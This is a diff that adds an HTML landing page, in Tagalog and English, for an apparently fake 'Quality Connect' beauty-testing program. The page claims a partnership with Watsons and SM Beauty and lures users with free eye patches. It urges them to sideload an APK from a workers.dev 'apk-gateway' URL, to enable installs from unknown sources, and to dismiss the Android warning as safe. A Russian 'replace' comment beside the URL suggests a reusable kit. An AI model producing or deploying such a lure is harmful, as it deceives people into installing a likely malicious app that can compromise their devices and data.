@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="tl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quality Connect</title>
+  <style>
+    :root {
+      --primary: #667eea;
+      --primary-dark: #5a67d8;
+      --secondary: #764ba2;
+      --success: #48bb78;
+      --warning: #ed8936;
+      --bg-light: #f7fafc;
+      --text-dark: #1a202c;
+      --text-gray: #4a5568;
+    }
+    
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      color: var(--text-dark);
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+    
+    .page-wrapper {
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .header {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+      border-radius: 20px;
+      padding: 48px 40px;
+      text-align: center;
+      color: white;
+      margin-bottom: 32px;
+      box-shadow: 0 20px 60px rgba(102, 126, 234, 0.3);
+    }
+    
+    .header h1 {
+      font-size: 36px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      letter-spacing: -0.5px;
+    }
+    
+    .header p {
+      font-size: 16px;
+      opacity: 0.95;
+      font-weight: 500;
+    }
+    
+    .trust-badge {
+      background: linear-gradient(135deg, #f0fff4 0%, #c6f6d5 100%);
+      border: 2px solid var(--success);
+      border-radius: 12px;
+      padding: 24px;
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    
+    .trust-badge strong {
+      display: block;
+      font-size: 19px;
+      color: #22543d;
+      margin-bottom: 8px;
+    }
+    
+    .trust-badge p {
+      font-size: 14px;
+      color: #2f855a;
+      margin: 0;
+    }
+    
+    .download-section {
+      background: white;
+      border-radius: 16px;
+      padding: 40px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      margin-bottom: 32px;
+    }
+    
+    .download-section h2 {
+      font-size: 28px;
+      margin-bottom: 24px;
+      color: var(--text-dark);
+    }
+    
+    .download-btn {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px 32px;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 24px rgba(102, 126, 234, 0.4);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+    
+    .download-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 32px rgba(102, 126, 234, 0.5);
+    }
+    
+    .download-btn:active {
+      transform: translateY(-1px);
+    }
+    
+    .download-btn:disabled {
+      background: #cbd5e0;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .card {
+      background: white;
+      border-radius: 16px;
+      padding: 32px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      margin-bottom: 24px;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    
+    .card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+    }
+    
+    .card h3 {
+      font-size: 20px;
+      margin-bottom: 16px;
+      color: var(--text-dark);
+      font-weight: 600;
+    }
+    
+    .card p {
+      font-size: 15px;
+      color: var(--text-gray);
+      line-height: 1.7;
+      margin-bottom: 12px;
+    }
+    
+    .feature-list {
+      list-style: none;
+      padding: 0;
+      margin: 20px 0;
+    }
+    
+    .feature-list li {
+      padding: 12px 0;
+      font-size: 15px;
+      color: var(--text-gray);
+      position: relative;
+      padding-left: 32px;
+      line-height: 1.6;
+    }
+    
+    .feature-list li::before {
+      content: "✓";
+      position: absolute;
+      left: 0;
+      color: var(--success);
+      font-weight: 700;
+      font-size: 20px;
+      top: 10px;
+    }
+    
+    .process-steps {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 16px;
+      margin: 20px 0;
+    }
+    
+    .step {
+      text-align: center;
+      padding: 20px 16px;
+      background: var(--bg-light);
+      border-radius: 12px;
+      transition: all 0.2s;
+    }
+    
+    .step:hover {
+      background: #edf2f7;
+      transform: translateY(-2px);
+    }
+    
+    .step-number {
+      display: inline-block;
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      border-radius: 50%;
+      line-height: 40px;
+      font-weight: 700;
+      font-size: 18px;
+      margin-bottom: 12px;
+    }
+    
+    .step strong {
+      display: block;
+      font-size: 14px;
+      color: var(--text-dark);
+      margin-bottom: 6px;
+    }
+    
+    .step p {
+      font-size: 13px;
+      color: var(--text-gray);
+      margin: 0;
+    }
+    
+    .info-box {
+      background: #fffaf0;
+      border-left: 4px solid var(--warning);
+      padding: 20px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #744210;
+      line-height: 1.7;
+    }
+    
+    .info-box strong {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 15px;
+    }
+    
+    .warning-box {
+      background: #fef5e7;
+      border-left: 4px solid #f39c12;
+      padding: 20px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #7d6608;
+      line-height: 1.7;
+    }
+    
+    .warning-box strong {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 15px;
+    }
+    
+    .faq-item {
+      background: var(--bg-light);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 16px;
+      transition: all 0.2s;
+    }
+    
+    .faq-item:hover {
+      background: #edf2f7;
+    }
+    
+    .faq-item strong {
+      display: block;
+      font-size: 15px;
+      color: var(--text-dark);
+      margin-bottom: 8px;
+    }
+    
+    .faq-item p {
+      font-size: 14px;
+      color: var(--text-gray);
+      margin: 0;
+    }
+    
+    @media (max-width: 768px) {
+      .header {
+        padding: 32px 24px;
+      }
+      
+      .header h1 {
+        font-size: 28px;
+      }
+      
+      .card {
+        padding: 24px;
+      }
+      
+      .download-section {
+        padding: 24px;
+      }
+      
+      .process-steps {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .card, .trust-badge, .download-section {
+      animation: fadeIn 0.5s ease-out;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-wrapper">
+    <div class="header">
+      <h1>Quality Connect</h1>
+      <p>Beauty Quality Control Program</p>
+    </div>
+
+    <div class="trust-badge">
+      <strong>✓ Official Beauty Quality Control Program</strong>
+      <p>In partnership with Watsons, SM Beauty, Beauty Bar, at iba pang kilalang retail stores</p>
+    </div>
+
+    <div class="download-section">
+      <h2>🎁 Welcome to Quality Connect</h2>
+      <button class="download-btn" onclick="download()" id="dl-btn">
+        <span style="font-size: 24px;">📥</span>
+        <span>I-download ang App</span>
+      </button>
+    </div>
+
+    <div class="card">
+      <h3>Tungkol sa Program</h3>
+      <p>Kasama ka ngayon sa official beauty quality control program na isinasagawa kasama ang leading beauty retail stores sa Pilipinas.</p>
+      
+      <ul class="feature-list">
+        <li>100% FREE participation</li>
+        <li>1 set ng premium eye patches</li>
+        <li>Walang bayad, walang bili</li>
+        <li>Walang subscription o credit card</li>
+        <li>Honest feedback lang ang kailangan</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h3>📱 Paano Gumagana?</h3>
+      
+      <div class="process-steps">
+        <div class="step">
+          <div class="step-number">1</div>
+          <strong>Download</strong>
+          <p>I-install ang app</p>
+        </div>
+        <div class="step">
+          <div class="step-number">2</div>
+          <strong>Select</strong>
+          <p>Piliin ang patches</p>
+        </div>
+        <div class="step">
+          <div class="step-number">3</div>
+          <strong>Get QR</strong>
+          <p>One-time code</p>
+        </div>
+        <div class="step">
+          <div class="step-number">4</div>
+          <strong>Pick-up</strong>
+          <p>Sa partner store</p>
+        </div>
+        <div class="step">
+          <div class="step-number">5</div>
+          <strong>Feedback</strong>
+          <p>Honest review</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="info-box">
+        <strong>Paano mag-install (Android):</strong>
+        1. I-download ang app (automatic start)<br>
+        2. Buksan ang downloaded file (app.apk)<br>
+        3. Payagan ang "Install from unknown sources"<br>
+        4. I-install at buksan ang app
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>📦 Ano ang nasa loob ng app?</h3>
+      <ul class="feature-list">
+        <li>Product selection - Available patch sets</li>
+        <li>QR code generator - One-time personal QR</li>
+        <li>Participation tracker - Real-time status</li>
+        <li>Feedback form - Simple honest review</li>
+        <li>Support chat - Direct project team</li>
+      </ul>
+      <p style="margin-top: 16px; font-size: 13px; font-style: italic;">Walang ads, walang payment, walang social media access.</p>
+    </div>
+
+    <div class="card">
+      <h3>🔒 Ligtas ba ang app?</h3>
+      <p><strong>Bakit hindi sa Google Play Store?</strong><br>
+      Private feedback app para sa selected participants lang, hindi public app.</p>
+      
+      <p style="margin-top: 16px;"><strong>Permissions:</strong></p>
+      <ul class="feature-list">
+        <li>One-time permission lang (QR + notifications)</li>
+        <li>Walang access sa contacts, photos, messages</li>
+        <li>Walang third-party tracking</li>
+        <li>Data para sa program feedback lang</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="warning-box">
+        <strong>⚠️ Android users - Normal warning:</strong>
+        Pag install, makikita ang "Unknown source" warning. Standard Android security feature lang para sa apps outside Play Store. Safe i-proceed.
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>📋 Mga Patakaran</h3>
+      <ul class="feature-list">
+        <li>1 participant = 1 patch set</li>
+        <li>QR code one-time use lang</li>
+        <li>Feedback required after using</li>
+        <li>Honest feedback - positive o negative</li>
+        <li>Walang bayad sa kahit anong step</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h3>❓ Madalas na Tanong</h3>
+      
+      <div class="faq-item">
+        <strong>Q: Kailangan ba mag-bayad?</strong>
+        <p>A: HINDI. 100% free. Walang bayad, hidden fees, o credit card.</p>
+      </div>
+
+      <div class="faq-item">
+        <strong>Q: Paano pick-up ng patches?</strong>
+        <p>A: Sa app makakuha ng QR code. I-show sa staff ng partner store.</p>
+      </div>
+
+      <div class="faq-item">
+        <strong>Q: Anong brand ng patches?</strong>
+        <p>A: Partner brands ng program. Makikita sa app.</p>
+      </div>
+
+      <div class="faq-item">
+        <strong>Q: Kailangan mag-feedback?</strong>
+        <p>A: OO. Honest feedback importante para sa quality improvement.</p>
+      </div>
+
+      <div class="faq-item">
+        <strong>Q: Pwede mag-participate ulit?</strong>
+        <p>A: 1 participant = 1 set lang. Stay tuned for future programs.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>📞 May tanong pa?</h3>
+      <p>Para sa questions about installation o program, contact project team through support chat sa loob ng app.</p>
+    </div>
+  </div>
+
+  <script>
+    const WORKER_URL = 'https://apk-gateway.loxnesgnome3332-881.workers.dev'; // ✅ ЗАМЕНИТЕ
+
+    const session = new URLSearchParams(location.search).get('session');
+
+    if (!session) {
+      alert('Session expired. Please enter your access code again.');
+      location.href = '/quality-connect-ph/';
+    }
+
+    function download() {
+      const btn = document.getElementById('dl-btn');
+      btn.disabled = true;
+      btn.innerHTML = '<span style="font-size: 24px;">⏳</span><span>Sinimu-simulan...</span>';
+
+      location.href = `${WORKER_URL}/download?session=${session}`;
+
+      setTimeout(() => {
+        btn.disabled = false;
+        btn.innerHTML = '<span style="font-size: 24px;">📥</span><span>I-download ang App</span>';
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
